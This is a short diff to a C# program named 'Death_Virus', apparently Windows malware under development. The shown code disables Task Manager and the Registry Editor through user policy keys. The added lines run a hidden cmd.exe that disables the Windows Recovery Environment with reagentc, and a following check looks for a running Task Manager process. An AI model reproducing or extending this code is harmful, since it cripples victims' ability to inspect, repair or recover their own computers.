@@ -74,6 +74,12 @@ namespace Death_Virus
             taskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
             RegistryKey regedit = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
             regedit.SetValue("DisableRegistryTools",1, RegistryValueKind.DWord);
+            ProcessStartInfo killrecovery = new ProcessStartInfo();
+            killrecovery.FileName = "cmd.exe";
+            killrecovery.WindowStyle = ProcessWindowStyle.Hidden;
+            killrecovery.Arguments = @"/k reagentc.exe /disable && exit";
+            var pr = Process.Start(killrecovery);
+            pr.WaitForExit();
             //Check process taskmgr
             Process[] pname = Process.GetProcessesByName("taskmgr");
             if(pname.Length == 1)
